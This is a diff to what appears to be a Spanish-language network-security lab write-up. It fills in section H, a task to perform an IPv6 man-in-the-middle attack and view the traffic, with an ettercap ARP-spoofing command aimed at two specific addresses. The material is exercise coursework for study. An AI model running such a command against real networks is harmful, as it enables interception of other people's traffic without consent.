@@ -150,7 +150,7 @@ En la máquina de la víctima simulamos una descarga del href introducido:
 
 
 ## APARTADO H
-> *Apartado incompleto*
+> ettercap -6 -T -q -i ens33 -M arp:remote //2002:a0b:3136::1/ //::10.11.48.1/
 Haga un MITM en IPv6 y visualice la paquetería.
 
 
